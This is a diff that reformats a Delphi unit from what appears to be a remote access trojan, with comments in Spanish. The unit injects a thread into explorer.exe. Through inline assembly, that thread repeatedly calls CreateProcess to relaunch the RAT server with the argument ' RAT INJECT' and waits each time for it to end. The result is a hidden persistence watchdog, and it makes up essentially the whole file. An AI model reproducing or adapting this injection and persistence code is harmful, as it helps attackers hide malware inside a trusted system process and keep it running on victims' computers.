@@ -1,80 +1,80 @@
 {Unit que se encarga de inyectar monitor a explorer.exe}
-Unit Monitor;
+unit Monitor;
 
 interface
 uses
   Windows,
   afxCodeHook;
 
-function InyectarMonitor(HExplorador : THandle;Navegador:string;instalado:boolean):boolean;
-procedure MonitorThreadYaInstalado(lpParameter: pointer); stdcall;
-procedure MonitorThreadNoInstalado(lpParameter: pointer); stdcall;
+function InyectarMonitor(HExplorador: THandle; Navegador: string; instalado: Boolean): Boolean;
+procedure MonitorThreadYaInstalado(lpParameter: Pointer); stdcall;
+procedure MonitorThreadNoInstalado(lpParameter: Pointer); stdcall;
 type
   TInjectInfo = record
     pBeep: Pointer;
     pSleep: Pointer;
     pCreateProcess: Pointer;
     pWaitForSingleObject: Pointer;
-    lpPathBrowser : Pointer;
-    lpProcInfo : Pointer;
-    lpProcInfo2 : Pointer;
-    lpStartupInfo : Pointer;
-    lpCommandLine : Pointer;
-    lpCallBack: pointer;
+    lpPathBrowser: Pointer;
+    lpProcInfo: Pointer;
+    lpProcInfo2: Pointer;
+    lpStartupInfo: Pointer;
+    lpCommandLine: Pointer;
+    lpCallBack: Pointer;
   end;
 
-  var
+var
   InjectInfo: TInjectInfo;
   Thread: THandle;
 
 implementation
-                           
-  function InyectarMonitor(HExplorador : THandle;Navegador:string;instalado:boolean):boolean;
-  begin
-    Result := false;
 
-    //Primero tenemos que inyectar la localización de las funciones que se usan en el thread del monitor
-    InjectInfo.pSleep               := GetProcAddress(GetModuleHandle('kernel32'), 'Sleep');
-    InjectInfo.pBeep                := GetProcAddress(GetModuleHandle('kernel32'), 'Beep'); //Para debug no viene mal
-    InjectInfo.pCreateProcess       := GetProcAddress(GetModuleHandle('kernel32'), 'CreateProcessA');
-    InjectInfo.pWaitForSingleObject := GetProcAddress(GetModuleHandle('kernel32'), 'WaitForSingleObject');
+function InyectarMonitor(HExplorador: THandle; Navegador: string; instalado: Boolean): Boolean;
+begin
+  Result := False;
 
-    //Despues inyectamos variables que utilizaremos
-    InjectInfo.lpPathBrowser  := InjectString(HExplorador, pchar(Navegador)); //Donde queramos inyectar el monitor
-    InjectInfo.lpProcInfo     := InjectMemory(HExplorador, nil, SizeOf(TProcessInformation));  //Reservamos memoria para procinfo
-    InjectInfo.lpProcInfo2    := InjectMemory(HExplorador, nil, SizeOf(TProcessInformation));  //Reservamos memoria para procinfo
-    InjectInfo.lpStartupInfo  := InjectMemory(HExplorador, nil, SizeOf(TStartupInfo));      // Lo mismo para startupinfo
-    InjectInfo.lpCommandLine  := InjectString(HExplorador, pchar(' RAT INJECT'));
-    InjectInfo.lpCallBack     := InjectString(HExplorador, pchar(paramstr(0)));
+  //Primero tenemos que inyectar la localización de las funciones que se usan en el thread del monitor
+  InjectInfo.pSleep := GetProcAddress(GetModuleHandle('kernel32'), 'Sleep');
+  InjectInfo.pBeep := GetProcAddress(GetModuleHandle('kernel32'), 'Beep'); //Para debug no viene mal
+  InjectInfo.pCreateProcess := GetProcAddress(GetModuleHandle('kernel32'), 'CreateProcessA');
+  InjectInfo.pWaitForSingleObject := GetProcAddress(GetModuleHandle('kernel32'), 'WaitForSingleObject');
 
-    //inyectamos la funcion MonitorThread y la ejecutamos en explorer.exe
-    if Instalado then
-      Thread := InjectThread(HExplorador, @MonitorThreadYaInstalado, @InjectInfo,   SizeOf(TInjectInfo), False) //Inyectamos el thread
-    else
-      Thread := InjectThread(HExplorador, @MonitorThreadNOInstalado, @InjectInfo,   SizeOf(TInjectInfo), False); //Inyectamos el thread
+  //Despues inyectamos variables que utilizaremos
+  InjectInfo.lpPathBrowser := InjectString(HExplorador, PChar(Navegador)); //Donde queramos inyectar el monitor
+  InjectInfo.lpProcInfo := InjectMemory(HExplorador, nil, SizeOf(TProcessInformation)); //Reservamos memoria para procinfo
+  InjectInfo.lpProcInfo2 := InjectMemory(HExplorador, nil, SizeOf(TProcessInformation)); //Reservamos memoria para procinfo
+  InjectInfo.lpStartupInfo := InjectMemory(HExplorador, nil, SizeOf(TStartupInfo)); // Lo mismo para startupinfo
+  InjectInfo.lpCommandLine := InjectString(HExplorador, PChar(' RAT INJECT'));
+  InjectInfo.lpCallBack := InjectString(HExplorador, PChar(ParamStr(0)));
 
-    if Thread = 0 then   //FAIL!
-      exit
-    else
-      CloseHandle(Thread);
-    Result := True;
-  end;
+  //inyectamos la funcion MonitorThread y la ejecutamos en explorer.exe
+  if Instalado then
+    Thread := InjectThread(HExplorador, @MonitorThreadYaInstalado, @InjectInfo, SizeOf(TInjectInfo), False) //Inyectamos el thread
+  else
+    Thread := InjectThread(HExplorador, @MonitorThreadNOInstalado, @InjectInfo, SizeOf(TInjectInfo), False); //Inyectamos el thread
 
-  procedure MonitorThreadYaInstalado(lpParameter: pointer); stdcall;    //Este es el código del antigüo monitor.dll, se ejecuta dentro de explorer.exe cuando el servidor ya esta instalado
-  var
-    InjectInfo       :  TInjectInfo;
-    ProcInfo         :  TProcessInformation;
-    ProcInfo2        :  TProcessInformation;
-    P                :  Pointer;
-    P2               :  Pointer;
-  begin
-    InjectInfo := TInjectInfo(lpParameter^);
-    ProcInfo := TProcessInformation(InjectInfo.lpProcInfo^);
-    P := @ProcInfo;
-    ProcInfo2 := TProcessInformation(InjectInfo.lpProcInfo2^);
-    P2 := @ProcInfo2;
+  if Thread = 0 then //FAIL!
+    Exit
+  else
+    CloseHandle(Thread);
+  Result := True;
+end;
 
-    asm
+procedure MonitorThreadYaInstalado(lpParameter: Pointer); stdcall; //Este es el código del antigüo monitor.dll, se ejecuta dentro de explorer.exe cuando el servidor ya esta instalado
+var
+  InjectInfo: TInjectInfo;
+  ProcInfo: TProcessInformation;
+  ProcInfo2: TProcessInformation;
+  P: Pointer;
+  P2: Pointer;
+begin
+  InjectInfo := TInjectInfo(lpParameter^);
+  ProcInfo := TProcessInformation(InjectInfo.lpProcInfo^);
+  P := @ProcInfo;
+  ProcInfo2 := TProcessInformation(InjectInfo.lpProcInfo2^);
+  P2 := @ProcInfo2;
+
+  asm
              @noret:
              //CreateProcess();
              PUSH  P
@@ -96,7 +96,7 @@ implementation
              PUSH  InjectInfo.lpStartupInfo
              PUSH  0
              PUSH  0
-             PUSH  0     
+             PUSH  0
              PUSH  0
              PUSH  0
              PUSH  0
@@ -113,23 +113,23 @@ implementation
 
                           //aquí tendriamos que idear algo para la desinstalación, de momento se encuentra inactiva
              JMP   @noret
-    end;
   end;
+end;
 
-  procedure MonitorThreadNoInstalado(lpParameter: pointer); stdcall;    //Este es el código del antigüo monitor.dll, se ejecuta dentro de explorer.exe cuando el servidor NO está instaldo
-  var
-    InjectInfo       :  TInjectInfo;
-    ProcInfo         :  TProcessInformation;
-    ProcInfo2        :  TProcessInformation;
-    P                :  Pointer;
-    P2               :  Pointer;
-  begin
-    InjectInfo := TInjectInfo(lpParameter^);
-    ProcInfo := TProcessInformation(InjectInfo.lpProcInfo^);
-    P := @ProcInfo;
-    ProcInfo2 := TProcessInformation(InjectInfo.lpProcInfo2^);
-    P2 := @ProcInfo2;
-    asm
+procedure MonitorThreadNoInstalado(lpParameter: Pointer); stdcall; //Este es el código del antigüo monitor.dll, se ejecuta dentro de explorer.exe cuando el servidor NO está instaldo
+var
+  InjectInfo: TInjectInfo;
+  ProcInfo: TProcessInformation;
+  ProcInfo2: TProcessInformation;
+  P: Pointer;
+  P2: Pointer;
+begin
+  InjectInfo := TInjectInfo(lpParameter^);
+  ProcInfo := TProcessInformation(InjectInfo.lpProcInfo^);
+  P := @ProcInfo;
+  ProcInfo2 := TProcessInformation(InjectInfo.lpProcInfo2^);
+  P2 := @ProcInfo2;
+  asm
              //CreateProcess();
              PUSH  P
              PUSH  InjectInfo.lpStartupInfo
@@ -150,7 +150,7 @@ implementation
              PUSH  InjectInfo.lpStartupInfo
              PUSH  0
              PUSH  0
-             PUSH  0     
+             PUSH  0
              PUSH  0
              PUSH  0
              PUSH  0
@@ -163,6 +163,6 @@ implementation
              CALL  InjectInfo.pWaitForSingleObject   //Esperamos a que termine el proceso
              //sleep(17000);
   end;
-  end;
+end;
 
 end.
